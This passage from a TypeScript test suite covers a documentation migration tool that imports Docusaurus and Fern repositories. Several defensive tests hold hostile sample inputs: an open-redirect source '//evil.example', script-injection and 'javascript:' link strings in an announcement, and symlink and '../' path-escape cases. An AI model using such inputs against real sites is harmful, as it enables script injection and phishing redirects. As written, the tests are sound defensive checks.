      code: 'unsupported-config',
      message: expect.stringContaining('wiki'),
    }))
  })

  it('imports @docusaurus/plugin-client-redirects rules declared inline in docusaurus.config, including a from: [] array', () => {
    const repositoryDir = mkdtempSync(join(tmpdir(), 'thally-migrate-docusaurus-inline-redirects-'))
    mkdirSync(join(repositoryDir, 'docs'), { recursive: true })
    writeFileSync(join(repositoryDir, 'docusaurus.config.ts'), `
      export default {
        presets: [['classic', { docs: { path: 'docs', sidebarPath: './sidebars.js' } }]],
        plugins: [
          ['@docusaurus/plugin-client-redirects', {
            redirects: [
              { to: '/guide', from: ['/old-guide', '/legacy/guide'] },
              { to: '/guide#section', from: '/guide/old-section' },
            ],
          }],
        ],
      }
    `)
    writeFileSync(join(repositoryDir, 'docs', 'guide.mdx'), '---\ntitle: Guide\n---\n\nGuide content.')

    const bundle = migrateRepository({ repositoryDir, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.docsConfig.redirects).toEqual(expect.arrayContaining([
      { source: '/old-guide', destination: '/guide' },
      { source: '/legacy/guide', destination: '/guide' },
      { source: '/guide/old-section', destination: '/guide#section' },
    ]))
  })

  it('imports @docusaurus/plugin-client-redirects rules from a separate module the config imports (Oasis: redirects.ts exports redirectsOptions), and warns about an unevaluable createRedirects function', () => {
    const repositoryDir = mkdtempSync(join(tmpdir(), 'thally-migrate-docusaurus-imported-redirects-'))
    mkdirSync(join(repositoryDir, 'docs'), { recursive: true })
    writeFileSync(join(repositoryDir, 'redirects.ts'), `
      import { Options } from '@docusaurus/plugin-client-redirects';

      export const redirectsOptions: Options = {
          redirects: [
              { to: '/build/tools/cli', from: ['/general/manage-tokens/advanced', '/general/manage-tokens/cli'] },
          ],
          createRedirects(existingPath) {
            return [];
          },
      };
    `)
    writeFileSync(join(repositoryDir, 'docusaurus.config.ts'), `
      import {redirectsOptions} from './redirects';
      export default {
        presets: [['classic', { docs: { path: 'docs', sidebarPath: './sidebars.js' } }]],
        plugins: [
          ['@docusaurus/plugin-client-redirects', redirectsOptions],
        ],
      }
    `)
    writeFileSync(join(repositoryDir, 'docs', 'cli.mdx'), '---\ntitle: CLI\n---\n\nCLI docs.')

    const bundle = migrateRepository({ repositoryDir, sourceUrl: 'https://github.com/oasisprotocol/docs' })

    expect(bundle.docsConfig.redirects).toEqual(expect.arrayContaining([
      { source: '/general/manage-tokens/advanced', destination: '/build/tools/cli' },
      { source: '/general/manage-tokens/cli', destination: '/build/tools/cli' },
    ]))
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      message: expect.stringContaining('createRedirects'),
    }))
  })

  it('rejects an unsafe redirect (protocol-relative //) from a Docusaurus redirects config instead of shipping an open redirect', () => {
    const repositoryDir = mkdtempSync(join(tmpdir(), 'thally-migrate-docusaurus-unsafe-redirect-'))
    mkdirSync(join(repositoryDir, 'docs'), { recursive: true })
    writeFileSync(join(repositoryDir, 'docusaurus.config.ts'), `
      export default {
        presets: [['classic', { docs: { path: 'docs', sidebarPath: './sidebars.js' } }]],
        plugins: [
          ['@docusaurus/plugin-client-redirects', {
            redirects: [{ to: '/guide', from: '//evil.example' }],
          }],
        ],
      }
    `)
    writeFileSync(join(repositoryDir, 'docs', 'guide.mdx'), '---\ntitle: Guide\n---\n\nGuide content.')

    const bundle = migrateRepository({ repositoryDir, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.docsConfig.redirects ?? []).not.toContainEqual(expect.objectContaining({ source: '//evil.example' }))
  })

  it('wires a static --ifm-color-primary accent from the classic theme\'s customCss into bundle.site.colors (Oasis: :root for light mode, [data-theme=dark] for dark mode)', () => {
    const repositoryDir = mkdtempSync(join(tmpdir(), 'thally-migrate-docusaurus-theme-color-'))
    mkdirSync(join(repositoryDir, 'docs'), { recursive: true })
    mkdirSync(join(repositoryDir, 'src', 'css'), { recursive: true })
    writeFileSync(join(repositoryDir, 'src', 'css', 'custom.css'), `
      :root {
        --ifm-color-primary: #0500e1;
      }
      html[data-theme='dark'] {
        --ifm-color-primary: #00ffff;
      }
    `)
    writeFileSync(join(repositoryDir, 'docusaurus.config.ts'), `
      export default {
        presets: [['classic', { docs: { path: 'docs', sidebarPath: './sidebars.js' }, theme: { customCss: require.resolve('./src/css/custom.css') } }]],
      }
    `)
    writeFileSync(join(repositoryDir, 'docs', 'guide.mdx'), '---\ntitle: Guide\n---\n\nGuide content.')

    const bundle = migrateRepository({ repositoryDir, sourceUrl: 'https://github.com/acme/docs' })

    // Infima's light/dark blocks are normal (unlike Mintlify's inverted
    // schema `site.colors` otherwise follows), so they're swapped the same
    // way Fern's colors are.
    expect(bundle.site?.colors).toEqual({ dark: '#0500e1', light: '#00ffff' })
  })

  it('wires copied Docusaurus logo and favicon assets into the migrated site', () => {
    const repositoryDir = mkdtempSync(join(tmpdir(), 'thally-migrate-docusaurus-brand-warning-'))
    mkdirSync(join(repositoryDir, 'docs'), { recursive: true })
    mkdirSync(join(repositoryDir, 'static', 'img', 'favicon'), { recursive: true })
    writeFileSync(join(repositoryDir, 'static', 'img', 'logo.svg'), '<svg xmlns="http://www.w3.org/2000/svg"/>')
    writeFileSync(join(repositoryDir, 'static', 'img', 'logo_dark.svg'), '<svg xmlns="http://www.w3.org/2000/svg"/>')
    writeFileSync(join(repositoryDir, 'static', 'img', 'favicon', 'favicon.ico'), 'icon')
    writeFileSync(join(repositoryDir, 'docusaurus.config.ts'), `
      export default {
        favicon: 'img/favicon/favicon.ico',
        presets: [['classic', { docs: { path: 'docs', sidebarPath: './sidebars.js' } }]],
        themeConfig: {
          navbar: {
            logo: { src: 'img/logo.svg', srcDark: 'img/logo_dark.svg' },
          },
        },
      }
    `)
    writeFileSync(join(repositoryDir, 'docs', 'guide.mdx'), '---\ntitle: Guide\n---\n\nGuide content.')

    const bundle = migrateRepository({ repositoryDir, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.docsConfig.navbar?.logo).toEqual({
      light: '/img/logo.svg',
      dark: '/img/logo_dark.svg',
      showTitle: false,
    })
    expect(bundle.docsConfig.favicon).toEqual({ light: '/img/favicon/favicon.ico' })
    expect(bundle.warnings).not.toContainEqual(expect.objectContaining({
      message: expect.stringMatching(/Brand asset\(s\) were referenced but not imported/),
    }))
  })
})

function fernFixture(): string {
  const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-'))
  const fernRoot = join(root, 'fern')
  mkdirSync(join(fernRoot, 'pages', 'advanced'), { recursive: true })
  mkdirSync(join(fernRoot, 'images'), { recursive: true })
  mkdirSync(join(fernRoot, 'openapi'), { recursive: true })
  writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
  writeFileSync(join(fernRoot, 'docs.yml'), `
title: Acme Docs
colors:
  accent-primary:
    light: "#008700"
    dark: "#70E155"
navbar-links:
  - type: github
    value: https://github.com/acme/acme
tabs:
  home:
    display-name: Home
    skip-slug: true
  guides:
    display-name: Guides
  api:
    display-name: API Reference
navigation:
  - tab: home
    layout:
      - page: Welcome
        path: pages/introduction.mdx
  - tab: guides
    layout:
      - section: Getting Started
        skip-slug: true
        contents:
          - page: Install
            path: pages/install.mdx
          - page: OpenAI
            path: pages/openai.mdx
          - page: Pinned
            path: pages/pinned.mdx
          - section: Reference
            slug: reference
            path: pages/reference-overview.mdx
            contents:
              - page: Detail
                path: pages/reference-detail.mdx
          - section: Advanced
            slug: advanced
            contents:
              - page: Config
                path: pages/advanced/config.mdx
  - tab: api
    layout:
      - api: API Reference
redirects:
  - source: /old-install
    destination: /guides/install
`)
  writeFileSync(join(fernRoot, 'openapi', 'openapi.yml'), 'openapi: 3.0.0\ninfo:\n  title: Acme API\n  version: "1.0"\npaths: {}\n')
  writeFileSync(join(fernRoot, 'pages', 'introduction.mdx'), '---\ntitle: Welcome\n---\n\n<Callout intent="warning">Read this first.</Callout>\n\n![Logo](../images/logo.svg)')
  writeFileSync(join(fernRoot, 'pages', 'install.mdx'), '---\ntitle: Install\n---\n\n<CodeBlocks>\n```bash\nnpm install acme\n```\n</CodeBlocks>\n\n<Success>Done.</Success>\n\nIf setup fails: "connection to {vendor} failed".')
  // Not referenced from docs.yml. Unlike Mintlify, Fern only serves pages
  // reachable from navigation, so this must be excluded, not imported as an orphan.
  writeFileSync(join(fernRoot, 'pages', 'orphan.mdx'), '---\ntitle: Orphan\n---\n\nNot in any navigation.')
  writeFileSync(join(fernRoot, 'pages', 'openai.mdx'), '---\ntitle: OpenAI\n---\n\nUse an OpenAI-compatible key.')
  writeFileSync(join(fernRoot, 'pages', 'pinned.mdx'), '---\ntitle: Pinned\nslug: pinned-page\n---\n\nA page pinned to a short URL.')
  writeFileSync(join(fernRoot, 'pages', 'reference-overview.mdx'), '---\ntitle: Reference overview\n---\n\nReference landing page.')
  writeFileSync(join(fernRoot, 'pages', 'reference-detail.mdx'), '---\ntitle: Reference detail\n---\n\nReference detail page.')
  writeFileSync(join(fernRoot, 'pages', 'advanced', 'config.mdx'), '---\ntitle: Config\n---\n\n<ParameterField name="apiKey" type="string" required>\n  Your API key.\n</ParameterField>\n\n<EndpointRequestSnippet />')
  writeFileSync(join(fernRoot, 'images', 'logo.svg'), '<svg xmlns="http://www.w3.org/2000/svg"/>')
  return root
}

describe('Fern repository migration', () => {
  it('keeps Fern navigation labels and excludes hidden pages from the sidebar', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-nav-labels-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(fernRoot)
    writeFileSync(join(fernRoot, 'fern.config.json'), '{}')
    writeFileSync(join(fernRoot, 'docs.yml'), 'navigation:\n  - section: Guides\n    contents:\n      - page: Overview\n        path: overview.mdx\n      - page: Legacy\n        hidden: true\n        path: legacy.mdx\n')
    writeFileSync(join(fernRoot, 'overview.mdx'), '---\ntitle: A Longer Page Title\n---\n\nContent.')
    writeFileSync(join(fernRoot, 'legacy.mdx'), '# Legacy page')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.pages.find((page) => page.title === 'A Longer Page Title')?.navTitle).toBe('Overview')
    expect(bundle.pages.find((page) => page.title === 'Legacy page')?.hidden).toBe(true)
    expect(JSON.stringify(bundle.docsConfig.tabs)).not.toContain('legacy')
    expect(bundle.docsConfig.api?.specLink).toBeUndefined()
  })

  it('preserves Fern announcements, external tabs, and logo suffixes', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-brand-nav-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'assets'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), '{}')
    writeFileSync(join(fernRoot, 'docs.yml'), [
      'announcement:',
      '  message: "Read the <a href=\\"https://example.com/news\\">news</a>. <script>alert(1)</script><a href=\\"javascript:alert(1)\\">bad</a> &lt;script&gt;"',
      'logo:',
      '  light: assets/logo.svg',
      '  right-text: docs',
      'tabs:',
      '  guides:',
      '    display-name: Guides',
      '  school:',
      '    display-name: School',
      '    href: https://example.com/school',
      'navigation:',
      '  - tab: guides',
      '    layout:',
      '      - page: Start',
      '        path: start.mdx',
      '  - tab: school',
      '    layout: []',
    ].join('\n'))
    writeFileSync(join(fernRoot, 'assets', 'logo.svg'), '<svg xmlns="http://www.w3.org/2000/svg"/>')
    writeFileSync(join(fernRoot, 'start.mdx'), '# Start')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.docsConfig.banner).toEqual({ content: 'Read the [news](https://example.com/news). bad &lt;script&gt;', dismissible: true })
    expect(bundle.docsConfig.tabs).toContainEqual({ tab: 'School', href: 'https://example.com/school' })
    expect(bundle.docsConfig.navbar?.logo).toEqual(expect.objectContaining({ light: '/assets/logo.svg', rightText: 'docs' }))
  })

  it('imports a Fern changelog tab as newest-first pages', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-changelog-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'pages', 'changelog'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), '{}')
    writeFileSync(join(fernRoot, 'docs.yml'), [
      'tabs:',
      '  guides:',
      '    display-name: Guides',
      '  releases:',
      '    display-name: Release Notes',
      '    slug: changelog',
      '    changelog: pages/changelog',
      'navigation:',
      '  - tab: guides',
      '    layout:',
      '      - page: Start',
      '        path: start.mdx',
      '  - tab: releases',
      '    layout: []',
    ].join('\n'))
    writeFileSync(join(fernRoot, 'start.mdx'), '# Start')
    writeFileSync(join(fernRoot, 'pages', 'changelog', '2025-01-01-first.mdx'), '# First')
    writeFileSync(join(fernRoot, 'pages', 'changelog', '2026-01-01-second.mdx'), '# Second')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const tab = bundle.docsConfig.tabs.find((entry) => entry.tab === 'Release Notes')
    expect(tab?.groups?.[0]?.pages).toEqual(['changelog'])
    expect(bundle.pages.some((page) => page.id === 'changelog/2026-01-01-second')).toBe(true)
    expect(bundle.pages.find((page) => page.id === 'changelog')?.body).toContain('## Second')
    expect(bundle.pages.find((page) => page.id === 'changelog/2025-01-01-first')?.hidden).toBe(true)
    expect(bundle.docsConfig.redirects ?? []).not.toContainEqual(expect.objectContaining({ source: '/changelog' }))
  })
  it('fills an empty Fern changelog overview with a dated feed and omits hidden archives', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-changelog-feed-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'pages', 'changelog'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), '{}')
    writeFileSync(join(fernRoot, 'docs.yml'), [
      'tabs:',
      '  releases:',
      '    display-name: Release Notes',
      '    slug: changelog',
      '    changelog: pages/changelog',
      'navigation:',
      '  - tab: releases',
      '    layout: []',
    ].join('\n'))
    writeFileSync(join(fernRoot, 'pages', 'changelog', 'overview.mdx'), '---\nslug: changelog\n---\n')
    writeFileSync(join(fernRoot, 'pages', 'changelog', 'release-notes.mdx'), '---\nhidden: true\n---\n# Archive\n\nOld updates.')
    writeFileSync(join(fernRoot, 'pages', 'changelog', '2025-01-01-first.mdx'), '# First\n\nFirst update.')
    writeFileSync(join(fernRoot, 'pages', 'changelog', '2026-01-01-second.mdx'), '# Second\n\nSecond update.\n\n## Details\n\n```ts\n## code comment\nconst value = 1')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const tab = bundle.docsConfig.tabs.find((entry) => entry.tab === 'Release Notes')
    expect(tab?.groups?.[0]?.pages).toEqual(['changelog'])
    expect(bundle.pages.find((page) => page.id === 'changelog')?.body).toContain('<a id="2026-01-01T00:00:00.000Z" />\n\n## Second\n\n**2026-01-01** · [Read release note](/changelog/2026-01-01-second)')
    expect(bundle.pages.find((page) => page.id === 'changelog')?.body).toContain('Second update.')
    expect(bundle.pages.find((page) => page.id === 'changelog')?.body).toContain('<a id="2026-01-01-details" />\n\n## Details')
    expect(bundle.pages.find((page) => page.id === 'changelog')?.body).not.toContain('2026-01-01-code-comment')
    expect(bundle.pages.find((page) => page.id === 'changelog')?.body).toContain('const value = 1\n\n```\n\n---\n\n<a id="2025-01-01T00:00:00.000Z" />')
    expect(bundle.pages.find((page) => page.id === 'changelog/2026-01-01-second')?.hidden).toBe(true)
    expect(tab?.groups?.[0]?.pages).not.toContain('changelog/release-notes')
    expect(bundle.pages.find((page) => page.id === 'changelog/release-notes')?.hidden).toBe(true)
    expect(bundle.docsConfig.redirects ?? []).not.toContainEqual(expect.objectContaining({ source: '/changelog' }))
  })
  it('resolves sibling pages and expands a versioned folder without leaving the repository', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-folders-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'versions', 'latest', 'pages', 'guide'), { recursive: true })
    mkdirSync(join(fernRoot, 'assets'), { recursive: true })
    mkdirSync(join(root, 'docs'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), '{}')
    writeFileSync(join(fernRoot, 'docs.yml'), [
      'versions:', '  - path: versions/main.yml', '    default: true',
    ].join('\n'))
    writeFileSync(join(fernRoot, 'versions', 'main.yml'), [
      'navigation:', '  - page: Overview', '    path: ../../docs/index.mdx',
      '  - folder: ./latest/pages/guide', '    title: Guide',
    ].join('\n'))
    writeFileSync(join(root, 'docs', 'index.mdx'), '# Overview')
    writeFileSync(join(fernRoot, 'versions', 'latest', 'pages', 'guide', 'index.mdx'), '# Guide\n\n![Diagram](../../../../assets/diagram.svg)')
    writeFileSync(join(fernRoot, 'assets', 'diagram.svg'), '<svg xmlns="http://www.w3.org/2000/svg"/>')
    writeFileSync(join(fernRoot, 'versions', 'latest', 'pages', 'guide', 'install.mdx'), '# Install')
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.pages.map((page) => page.id)).toEqual(expect.arrayContaining(['overview', 'guide', 'guide/install']))
    expect(bundle.pages.find((page) => page.id === 'guide')?.body).toContain('![Diagram](/assets/diagram.svg)')
    expect(bundle.warnings.filter((warning) => warning.code === 'missing-page')).toEqual([])
  })

  it('keeps a root tab and folder directory routes when their display names differ', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-folder-routes-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'versions', 'latest', 'pages', 'model-server'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), '{}')
    writeFileSync(join(fernRoot, 'docs.yml'), 'versions:\n  - path: versions/main.yml\n    slug: main\n    default: true\n')
    writeFileSync(join(fernRoot, 'versions', 'main.yml'), [
      'tabs:', '  docs:', '    display-name: Documentation', '    slug: ""',
      'navigation:', '  - tab: docs', '    layout:', '      - folder: ./latest/pages/model-server', '        title: Configure Models',
    ].join('\n'))
    writeFileSync(join(fernRoot, 'versions', 'latest', 'pages', 'model-server', 'index.mdx'), '# Models\n\n[Setup](/main/model-server/setup)')
    writeFileSync(join(fernRoot, 'versions', 'latest', 'pages', 'model-server', 'setup.mdx'), '# Setup')
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.pages.map((page) => page.id).sort()).toEqual(['model-server', 'model-server/setup'])
    expect(bundle.pages[0].body).toContain('[Setup](/model-server/setup)')
  })

  it('does not treat a configured AsyncAPI file as an OpenAPI reference', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-asyncapi-mislabeled-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'apis', 'calls'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), '{}')
    writeFileSync(join(fernRoot, 'docs.yml'), 'navigation:\n  - page: Overview\n    path: overview.mdx\n  - api: Calls\n    api-name: calls\n')
    writeFileSync(join(fernRoot, 'overview.mdx'), '# Overview')
    writeFileSync(join(fernRoot, 'apis', 'calls', 'generators.yml'), 'api:\n  specs:\n    - openapi: ./call.yml\n')
    writeFileSync(join(fernRoot, 'apis', 'calls', 'call.yml'), 'asyncapi: 3.0.0\ninfo: { title: Calls, version: 1.0.0 }\nchannels: {}\n')
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.docsConfig.tabs.some((tab) => tab.api)).toBe(false)
    expect(bundle.warnings.some((warning) => warning.message.includes('AsyncAPI is not supported'))).toBe(true)
  })

  it('strips a Fern instance base path from internal links but preserves examples', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-basepath-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(fernRoot)
    writeFileSync(join(fernRoot, 'fern.config.json'), '{}')
    writeFileSync(join(fernRoot, 'docs.yml'), 'instances:\n  - custom-domain: docs.example.com/skills\nnavigation:\n  - page: Overview\n    path: overview.mdx\n  - page: Guide\n    path: guide.mdx\n')
    writeFileSync(join(fernRoot, 'overview.mdx'), '# Overview\n\n[Guide](/skills/guide) <a href="/skills/guide">Guide</a>\n\n```md\n[Example](/skills/guide)\n```')
    writeFileSync(join(fernRoot, 'guide.mdx'), '# Guide')
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const body = bundle.pages[0].body
    expect(body).toContain('[Guide](/guide)')
    expect(body).toContain('href="/guide"')
    expect(body).toContain('[Example](/skills/guide)')
  })

  it('retains unresolved Fern references on the published source site', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-external-links-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(fernRoot)
    writeFileSync(join(fernRoot, 'fern.config.json'), '{}')
    writeFileSync(join(fernRoot, 'docs.yml'), 'instances:\n  - custom-domain: docs.example.com/product\nversions:\n  - path: main.yml\n    slug: main\n')
    writeFileSync(join(fernRoot, 'main.yml'), 'navigation:\n  - page: Overview\n    path: overview.mdx\n')
    writeFileSync(join(fernRoot, 'overview.mdx'), '# Overview\n\n[API](/main/reference/missing) <a href="/main/reference/missing">API</a>\n\n[Unsafe](/javascript:alert)\n\n```md\n[Example](/main/reference/missing)\n```')
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const body = bundle.pages[0].body
    expect(body).toContain('[API](https://docs.example.com/product/main/reference/missing)')
    expect(body).toContain('href="https://docs.example.com/product/main/reference/missing"')
    expect(body).toContain('[Unsafe](/javascript:alert)')
    expect(body).toContain('[Example](/main/reference/missing)')
    expect(bundle.warnings.some((warning) => warning.message.includes('unresolved Fern link'))).toBe(true)
  })

  it('keeps versioned Fern image references on the migrated site', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-versioned-image-'))
    const fernRoot = join(root, 'fern')
    const pageDir = join(fernRoot, 'versions', 'latest', 'pages', 'about')
    mkdirSync(pageDir, { recursive: true })
    mkdirSync(join(fernRoot, 'assets', 'images'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), '{}')
    writeFileSync(join(fernRoot, 'docs.yml'), 'instances:\n  - custom-domain: docs.example.com/product\nversions:\n  - path: versions/latest.yml\n    slug: main\n')
    writeFileSync(join(fernRoot, 'versions', 'latest.yml'), 'navigation:\n  - page: About\n    path: ./latest/pages/about/index.mdx\n')
    writeFileSync(join(pageDir, 'index.mdx'), '# About\n\n![Overview](../../../../assets/images/overview.png)\n\n[Missing](/main/missing)')
    writeFileSync(join(fernRoot, 'assets', 'images', 'overview.png'), 'image')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.pages.find((page) => page.id === 'about')?.body).toContain('![Overview](/assets/images/overview.png)')
    expect(bundle.pages.find((page) => page.id === 'about')?.body).toContain('[Missing](https://docs.example.com/product/main/missing)')
    expect(bundle.assets.some((asset) => asset.path === 'assets/images/overview.png')).toBe(true)
  })

  it('does not rewrite assets reached through a symlink outside the repository', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-unsafe-asset-'))
    const outside = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-unsafe-asset-outside-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(fernRoot)
    writeFileSync(join(fernRoot, 'fern.config.json'), '{}')
    writeFileSync(join(fernRoot, 'docs.yml'), 'navigation:\n  - page: Overview\n    path: overview.mdx\n')
    writeFileSync(join(fernRoot, 'overview.mdx'), '# Overview\n\n![Private](assets/private.png)')
    writeFileSync(join(outside, 'private.png'), 'private bytes')
    symlinkSync(outside, join(fernRoot, 'assets'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.pages[0].body).toContain('![Private](assets/private.png)')
    expect(bundle.assets.some((asset) => asset.path === 'assets/private.png')).toBe(false)
  })

  it('rewrites links based on a Fern page source path when a section title changes its route', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-source-links-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'pages', 'features', 'tts-vendors'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), '{}')
    writeFileSync(join(fernRoot, 'docs.yml'), [
      'tabs:', '  guides:', '    display-name: Guides', '    slug: guides',
      'navigation:', '  - tab: guides', '    layout:',
      '      - section: Features', '        contents:',
      '          - section: TTS Vendor Settings', '            contents:',
      '              - page: Overview', '                path: ./pages/features/tts-vendors/overview.mdx',
      '              - page: Cartesia', '                path: ./pages/features/tts-vendors/cartesia.mdx',
    ].join('\n'))
    writeFileSync(join(fernRoot, 'pages', 'features', 'tts-vendors', 'overview.mdx'), '# Overview\n\n[Cartesia](/guides/features/tts-vendors/cartesia)\n\n```md\n[Source](/guides/features/tts-vendors/cartesia)\n```')
    writeFileSync(join(fernRoot, 'pages', 'features', 'tts-vendors', 'cartesia.mdx'), '# Cartesia')
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.pages.find((page) => page.id.endsWith('/overview'))?.body).toContain('[Cartesia](/guides/features/tts-vendor-settings/cartesia)')
    expect(bundle.pages.find((page) => page.id.endsWith('/overview'))?.body).toContain('[Source](/guides/features/tts-vendors/cartesia)')
  })

  it('skips a symlinked versions file instead of reading through it', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-versions-'))
    const outside = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-outside-'))
    writeFileSync(join(outside, 'v1.yml'), 'navigation:\n  - page: Secret\n    path: secret.mdx\n')
    symlinkSync(join(outside, 'v1.yml'), join(root, 'v1.yml'))
    const config = {
      versions: [{ version: 'v1', path: 'v1.yml', default: true }],
    }
    const projected = projectFernNavigation({ config, fernRoot: root })
    expect(projected.docsConfig.tabs).toEqual([])
    expect(projected.descriptors).toEqual([])
    expect(projected.warnings.some((warning) => warning.message.includes('not a regular file'))).toBe(true)
    // A failed read is reported through the same warning, not swallowed.
    expect(projected.warnings.some((warning) => warning.message.includes('could not be read'))).toBe(false)
    // Exactly one version exists (and it's the one imported), so nothing was
    // actually skipped — the warning must not fire.
    expect(projected.warnings.some((warning) => warning.message.includes('were skipped'))).toBe(false)
  })

  it('reports which Fern versions were skipped, and only when more than one exists', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-versions-multi-'))
    writeFileSync(join(root, 'v1.yml'), 'navigation:\n  - page: V1\n    path: v1.mdx\n')
    writeFileSync(join(root, 'v2.yml'), 'navigation:\n  - page: V2\n    path: v2.mdx\n')
    const config = {
      versions: [
        { version: 'v1', path: 'v1.yml' },
        { version: 'v2', path: 'v2.yml', default: true },
        { version: 'v3', path: 'v3.yml' },
      ],
    }
    const projected = projectFernNavigation({ config, fernRoot: root })
    const warning = projected.warnings.find((entry) => entry.message.includes('were skipped'))
    expect(warning?.message).toContain('v1')
    expect(warning?.message).toContain('v3')
    expect(warning?.message).not.toContain('v2')
  })

  it('warns instead of silently skipping when a chosen version file cannot be read', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-versions-unreadable-'))
    // Oversized rather than malformed: the `yaml` parser is lenient about
    // syntax, but `readBoundedYaml` throws once a file exceeds its 20 MB cap,
    // which previously hit the bare `catch {}` and vanished without a trace.
    writeFileSync(join(root, 'v1.yml'), `navigation:\n${'  # padding\n'.repeat(1_800_000)}`)
    const config = { versions: [{ version: 'v1', path: 'v1.yml', default: true }] }
    const projected = projectFernNavigation({ config, fernRoot: root })
    expect(projected.warnings.some((warning) => warning.message.includes('could not be read'))).toBe(true)
  })

  it('resolves a Fern version file living outside fern/ (a legitimate sibling docs/ layout) and imports its pages', () => {
    // NVIDIA-NeMo/Guardrails' real layout: fern/docs.yml declares
    // `versions: [{ path: ../docs/index.yml }]`, a sibling of fern/ rather
    // than a file under it. Previously this failed outright ("Migration
    // path escapes its root") because the version file was confined to
    // fern/ instead of the whole repository checkout.
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-versions-sibling-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(fernRoot, { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), 'versions:\n  - version: v1\n    path: ../docs/index.yml\n    default: true\n')
    mkdirSync(join(root, 'docs'), { recursive: true })
    writeFileSync(join(root, 'docs', 'index.yml'), 'navigation:\n  - page: Welcome\n    path: welcome.mdx\n')
    writeFileSync(join(root, 'docs', 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello from outside fern/.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    expect(bundle.warnings.some((warning) => warning.message.includes('escapes its root'))).toBe(false)
    expect(bundle.warnings.some((warning) => warning.message.includes('could not be read'))).toBe(false)
    const welcome = bundle.pages.find((page) => page.id === 'welcome')
    expect(welcome?.body).toContain('Hello from outside fern/.')
  })

  it('still rejects a Fern version file that escapes the repository checkout itself', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-versions-escape-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(fernRoot, { recursive: true })
    const config = { versions: [{ version: 'v1', path: '../../outside.yml', default: true }] }
    const projected = projectFernNavigation({ config, fernRoot, repositoryRoot: root })
    expect(projected.warnings.some((warning) =>
      warning.message.includes('Skipped the Fern version file') && warning.message.includes('points outside the repository'))).toBe(true)
  })

  it('imports every product from a `products:` docs.yml as its own top-level, route-prefixed tab', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-products-'))
    mkdirSync(join(root, 'products', 'sdks'), { recursive: true })
    mkdirSync(join(root, 'products', 'dashboard', 'pages'), { recursive: true })
